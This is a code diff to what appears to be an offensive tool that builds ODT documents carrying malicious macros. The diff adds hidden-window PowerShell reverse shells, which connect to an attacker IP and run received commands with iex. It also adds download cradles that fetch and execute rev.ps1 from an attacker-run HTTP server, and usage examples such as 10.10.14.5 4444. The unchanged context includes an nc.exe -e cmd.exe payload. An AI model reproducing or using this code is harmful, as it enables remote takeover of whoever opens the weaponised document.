@@ -276,6 +276,56 @@ def _build_windows_payloads():
     add("powershell-tls", "PowerShell TLS encrypted shell", "powershell",
         _ps_tls)
 
+    # -- PowerShell one-liners (no base64) --
+    def _ps_oneliner(ip, p, hp=80):
+        ps = (f"$c=New-Object System.Net.Sockets.TCPClient('{ip}',{p});"
+              "$s=$c.GetStream();"
+              "[byte[]]$b=0..65535|%{0};"
+              "while(($i=$s.Read($b,0,$b.Length)) -ne 0)"
+              "{$d=(New-Object System.Text.ASCIIEncoding).GetString($b,0,$i);"
+              "$r=(iex $d 2>&1|Out-String);"
+              "$r2=$r+'PS '+(pwd).Path+'> ';"
+              "$sb=([Text.Encoding]::ASCII).GetBytes($r2);"
+              "$s.Write($sb,0,$sb.Length);"
+              "$s.Flush()};"
+              "$c.Close()")
+        return _macro("powershell.exe", f"-nop -w hidden -c {ps}")
+
+    add("ps-oneliner", "PowerShell TCPClient inline (no base64)", "powershell",
+        _ps_oneliner)
+
+    def _ps_oneliner_trycatch(ip, p, hp=80):
+        ps = (f"$c=New-Object System.Net.Sockets.TCPClient('{ip}',{p});"
+              "$s=$c.GetStream();"
+              "[byte[]]$b=0..65535|%{0};"
+              "while(($i=$s.Read($b,0,$b.Length)) -ne 0)"
+              "{$d=(New-Object System.Text.ASCIIEncoding).GetString($b,0,$i);"
+              "try{$r=(iex $d 2>&1|Out-String)}catch{$r=$_.Exception.Message};"
+              "$r2=$r+'PS '+(pwd).Path+'> ';"
+              "$sb=([Text.Encoding]::ASCII).GetBytes($r2);"
+              "$s.Write($sb,0,$sb.Length);"
+              "$s.Flush()};"
+              "$c.Close()")
+        return _macro("powershell.exe", f"-nop -w hidden -c {ps}")
+
+    add("ps-oneliner-trycatch", "PowerShell inline with error handling", "powershell",
+        _ps_oneliner_trycatch)
+
+    # -- PowerShell download cradles --
+    def _ps_download_cradle(ip, p, hp=80):
+        return _macro("powershell.exe",
+                      f"-nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://{ip}:{hp}/rev.ps1')")
+
+    add("ps-download-cradle", "Download cradle (Net.WebClient)",
+        "powershell, http server", _ps_download_cradle)
+
+    def _ps_download_iwr(ip, p, hp=80):
+        return _macro("powershell.exe",
+                      f"-nop -w hidden -c IEX(Invoke-WebRequest -Uri http://{ip}:{hp}/rev.ps1 -UseBasicParsing).Content")
+
+    add("ps-download-iwr", "Download cradle (Invoke-WebRequest)",
+        "powershell 3.0+, http server", _ps_download_iwr)
+
     # -- nc.exe --
     add("nc", "nc.exe -e cmd.exe", "nc.exe on target",
         lambda ip, p, hp=80: _windows_cmd(f"nc.exe -e cmd.exe {ip} {p}"))
@@ -507,6 +557,8 @@ def main():
             "examples:\n"
             "  %(prog)s 10.10.14.5 4444\n"
             "  %(prog)s 10.10.14.5 4444 --os windows --payload powershell-tls\n"
+            "  %(prog)s 10.10.14.5 4444 --os windows -p ps-oneliner\n"
+            "  %(prog)s 10.10.14.5 4444 --os windows -p ps-download-cradle --http-port 8080\n"
             "  %(prog)s 10.10.14.5 9001 --payload nc-mkfifo -o doc.odt\n"
             "  %(prog)s 10.10.14.5 4444 -p nc-download-wget --http-port 8080\n"
             "  %(prog)s 10.10.14.5 4444 --os windows -p nc-download-certutil --http-port 8000\n"
@@ -575,11 +627,12 @@ def main():
         parser.error("--http-port must be between 1 and 65535")
 
     # Build the macro
+    payload_name = None
     if args.cmd:
         if args.target_os == "linux":
             macro = _linux(args.cmd)
         else:
-            macro = _windows_ps(args.cmd)
+            macro = _macro("powershell.exe", f"-nop -w hidden -c {args.cmd}")
         label = f"custom — {args.cmd[:60]}"
     else:
         defaults = {"linux": "bash-tcp", "windows": "powershell"}
@@ -596,7 +649,7 @@ def main():
         macro = payload["build"](args.ip, args.port, args.http_port)
         label = f"{payload_name} — {payload['desc']}"
 
-        if payload_name.startswith("nc-download") and args.http_port != 80:
+        if (payload_name.startswith("nc-download") or payload_name.startswith("ps-download")) and args.http_port != 80:
             label += f" (http:{args.http_port})"
 
     # Inject pre-commands
@@ -606,6 +659,10 @@ def main():
             print(f"[+] Pre-cmd:  {cmd}")
 
     generate_odt(args.ip, args.port, args.target_os, args.output, macro, label)
+
+    if payload_name and payload_name.startswith("ps-download"):
+        print(f"\n[*] Host rev.ps1 on port {args.http_port}:")
+        print(f"    python3 -m http.server {args.http_port}")
 
 
 if __name__ == "__main__":
